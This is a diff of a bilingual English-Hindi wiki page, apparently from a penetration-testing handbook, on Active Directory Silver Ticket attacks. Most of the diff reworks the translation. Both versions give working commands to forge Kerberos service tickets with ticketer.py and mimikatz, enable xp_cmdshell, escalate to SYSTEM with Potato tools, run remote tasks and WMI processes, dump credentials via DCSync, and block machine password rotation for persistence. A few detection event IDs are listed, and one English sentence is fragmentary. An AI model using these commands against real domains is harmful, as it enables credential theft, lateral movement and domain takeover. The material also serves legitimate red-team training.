@@ -6,13 +6,13 @@
 
 ## Silver ticket
 
-The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. यह **Silver Ticket** हमला Active Directory (AD) वातावरण में service tickets के शोषण पर आधारित है। This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. यह तरीका किसी service account का **NTLM hash प्राप्त करने** पर निर्भर करता है, जैसे कि computer account, ताकि Ticket Granting Service (TGS) ticket को forge किया जा सके। With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. इस forged ticket के साथ, attacker नेटवर्क पर विशिष्ट services तक पहुँच सकता है, **किसी भी user के रूप में impersonate करके**, आमतौर पर administrative privileges हासिल करने के लिए। It's emphasized that using AES keys for forging tickets is more secure and less detectable. यहाँ ज़ोर दिया जाता है कि tickets को forge करने के लिए AES keys का उपयोग अधिक सुरक्षित और कम detectable होता है।
+The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.
 
 > [!WARNING]
-> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. हालांकि, Silver Tickets Golden Tickets की तुलना में कम detectable होते हैं क्योंकि इन्हें केवल **service account का hash** चाहिए होता है, krbtgt account की आवश्यकता नहीं होती। However, they are limited to the specific service they target. हालांकि, ये केवल उस specific service तक सीमित होते हैं जिसे वे target करते हैं। Moreover, just stealing the password of a user. इसके अलावा, सिर्फ किसी user का password चुराना।
-Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service. इसके अलावा, यदि आप किसी **account का password जिसमें SPN हो** compromise कर लेते हैं, तो आप उस password का उपयोग करके उस service के लिए किसी भी user के रूप में impersonate करने वाला Silver Ticket बना सकते हैं।
+> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
+Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.
 
-For ticket crafting, different tools are employed based on the operating system: Ticket crafting के लिए, ऑपरेटिंग सिस्टम के आधार पर विभिन्न tools का उपयोग किया जाता है:
+For ticket crafting, different tools are employed based on the operating system:
 
 ### On Linux
 ```bash
@@ -37,11 +37,11 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-CIFS सेवा को पीड़ित के फ़ाइल सिस्टम तक पहुँचने के लिए एक सामान्य लक्ष्य के रूप में हाइलाइट किया गया है, लेकिन HOST और RPCSS जैसी अन्य सेवाओं का भी टास्क और WMI क्वेरीज़ के लिए शोषण किया जा सकता है।
+CIFS service को पीड़ित के फ़ाइल सिस्टम तक पहुँचने के सामान्य लक्ष्य के रूप में हाइलाइट किया गया है, लेकिन HOST और RPCSS जैसी अन्य services को भी टास्क और WMI queries के लिए एक्स्प्लोइट किया जा सकता है।
 
 ### उदाहरण: MSSQL service (MSSQLSvc) + Potato to SYSTEM
 
-यदि आपके पास किसी SQL service account (उदा., sqlsvc) का NTLM hash (या AES key) है, तो आप MSSQL SPN के लिए एक TGS forge कर सकते हैं और SQL service पर किसी भी user को impersonate कर सकते हैं। वहां से, xp_cmdshell को enable करके SQL service account के रूप में commands execute कर सकते हैं। यदि उस token में SeImpersonatePrivilege है, तो Potato को chain करके SYSTEM तक elevate कर लें।
+यदि आपके पास किसी SQL service account (उदा., sqlsvc) का NTLM hash (या AES key) है, तो आप MSSQL SPN के लिए एक TGS फोर्ज कर सकते हैं और SQL service के लिए किसी भी उपयोगकर्ता का impersonate कर सकते हैं। वहाँ से, xp_cmdshell को सक्षम करके SQL service अकाउंट के रूप में कमांड निष्पादित करें। यदि उस token में SeImpersonatePrivilege है, तो Potato को chain करके SYSTEM तक elevate कर लें।
 ```bash
 # Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
 python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
@@ -52,20 +52,20 @@ export KRB5CCNAME=$PWD/administrator.ccache
 impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
 -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
 ```
-- यदि परिणामी संदर्भ में SeImpersonatePrivilege हो (अक्सर service accounts के लिए सत्य), SYSTEM प्राप्त करने के लिए Potato variant का उपयोग करें:
+- यदि परिणामी context में SeImpersonatePrivilege मौजूद है (अक्सर service accounts के लिए सत्य), SYSTEM प्राप्त करने के लिए Potato variant का उपयोग करें:
 ```bash
 # On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
 PrintSpoofer.exe -c "cmd /c whoami"
 # or
 GodPotato -cmd "cmd /c whoami"
 ```
-More details on abusing MSSQL and enabling xp_cmdshell:
-  
+MSSQL का दुरुपयोग करने और xp_cmdshell को सक्षम करने के बारे में अधिक विवरण:
+
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
 
-Potato techniques overview:
+Potato techniques का अवलोकन:
 
 {{#ref}}
 ../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
@@ -73,53 +73,52 @@ Potato techniques overview:
 
 ## उपलब्ध सेवाएँ
 
-| Service Type                               | Service Silver Tickets                                                     |
+| सेवा प्रकार                                | Service Silver Tickets                                                     |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OS पर निर्भर होकर:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>कुछ परिस्थितियों में आप बस अनुरोध कर सकते हैं: WINRM</p> |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
 | Scheduled Tasks                            | HOST                                                                       |
 | Windows File Share, also psexec            | CIFS                                                                       |
 | LDAP operations, included DCSync           | LDAP                                                                       |
 | Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
 | Golden Tickets                             | krbtgt                                                                     |
 
-Using **Rubeus** you may **ask for all** these tickets using the parameter:
+Rubeus का उपयोग करके आप इन सभी tickets के लिए निम्न parameter का उपयोग कर अनुरोध कर सकते हैं:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Silver tickets Event IDs
+### Silver tickets के Event IDs
 
 - 4624: खाता लॉगऑन
 - 4634: खाता लॉगऑफ
 - 4672: प्रशासक लॉगऑन
 
-## Persistence
+## स्थायी पहुँच
 
-मशीनों को हर 30 दिनों में अपना पासवर्ड बदलने से रोकने के लिए सेट करें `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` या आप `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` को 30days से बड़े मान पर सेट कर सकते हैं ताकि यह बत सके कि मशीन का पासवर्ड किस अवधि पर रोटेट होना चाहिए।
+मशीनों के पासवर्ड को हर 30 दिनों में बदलने से रोकने के लिए `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` सेट करें या आप `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` को 30 दिनों से बड़ी वैल्यू पर सेट कर सकते हैं ताकि यह बताना आसान हो कि मशीन का पासवर्ड कब रोटेट होना चाहिए।
 
-## Abusing Service tickets
+## Service tickets का दुरुपयोग
 
-नीचे के उदाहरणों में मान लें कि टिकट प्रशासक खाते का नक्कल करके हासिल किया गया है।
+निम्न उदाहरणों में मान लें कि टिकट प्रशासक खाते की नकल करके प्राप्त किया गया है।
 
 ### CIFS
 
-इस टिकट के साथ आप रिमोट फाइल सिस्टम में `C$` और `ADMIN$` फ़ोल्डर तक **SMB** के जरिए पहुँच सकेंगे (यदि वे एक्सपोज़्ड हैं) और रिमोट फाइल सिस्टम के किसी हिस्से में फाइल कॉपी कर सकेंगे, कुछ इस तरह:
+इस टिकट के साथ आप `C$` और `ADMIN$` फ़ोल्डर को **SMB** के माध्यम से एक्सेस कर पाएँगे (यदि वे एक्सपोज़्ड हैं) और रिमोट फाइलसिस्टम के किसी हिस्से में फाइलें कॉपी कर सकेंगे, कुछ ऐसा करते हुए:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-आप **psexec** का उपयोग करके होस्ट के अंदर shell प्राप्त कर सकते हैं या arbitrary commands चला सकते हैं:
-
+आप होस्ट के अंदर शेल प्राप्त कर पाएंगे या **psexec** का उपयोग करके मनमाने कमांड निष्पादित कर पाएंगे:
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
 {{#endref}}
 
-### HOST
+### होस्ट
 
-इस अनुमति से आप remote computers पर scheduled tasks बना सकते हैं और arbitrary commands चला सकते हैं:
+इस अनुमति के साथ आप रिमोट कंप्यूटरों में शेड्यूल किए गए टास्क बना सकते हैं और मनमाने कमांड निष्पादित कर सकते हैं:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -133,7 +132,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
 ### HOST + RPCSS
 
-इन tickets के साथ आप लक्षित सिस्टम पर **WMI चला सकते हैं**:
+इन टिकटों के साथ आप **लक्षित सिस्टम में WMI निष्पादित कर सकते हैं**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -143,7 +142,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-निम्न पृष्ठ में **wmiexec के बारे में अधिक जानकारी** देखें:
+निम्न पृष्ठ पर **wmiexec के बारे में अधिक जानकारी** देखें:
 
 {{#ref}}
 ../lateral-movement/wmiexec.md
@@ -151,11 +150,11 @@ wmic remote.computer.local list full /format:list
 
 ### होस्ट + WSMAN (WINRM)
 
-किसी कंप्यूटर पर winrm एक्सेस होने पर आप इसे **एक्सेस कर सकते हैं** और यहां तक कि PowerShell भी प्राप्त कर सकते हैं:
+किसी कंप्यूटर पर winrm एक्सेस होने पर आप **इसे एक्सेस** कर सकते हैं और यहाँ तक कि PowerShell भी प्राप्त कर सकते हैं:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-निम्नलिखित पृष्ठ देखें ताकि आप **रिमोट होस्ट से winrm का उपयोग करके कनेक्ट करने के अधिक तरीके** जान सकें:
+Check the following page to learn **more ways to connect with a remote host using winrm**:
 
 
 {{#ref}}
@@ -163,15 +162,15 @@ New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 {{#endref}}
 
 > [!WARNING]
-> ध्यान दें कि **winrm को रिमोट कंप्यूटर पर सक्रिय और सुनने की स्थिति में होना चाहिए** ताकि इसे एक्सेस किया जा सके।
+> ध्यान दें कि **winrm रिमोट कंप्यूटर पर सक्रिय और सुनने की स्थिति में होना चाहिए** ताकि उस तक पहुँच की जा सके।
 
 ### LDAP
 
-इस विशेषाधिकार के साथ आप **DCSync** का उपयोग करके DC डेटाबेस डंप कर सकते हैं:
+इस विशेषाधिकार के साथ आप **DCSync** का उपयोग करके DC डेटाबेस को dump कर सकते हैं:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-**DCSync के बारे में अधिक जानें** निम्नलिखित पृष्ठ में:
+**DCSync के बारे में अधिक जानें** निम्नलिखित पृष्ठ पर:
 
 
 {{#ref}}
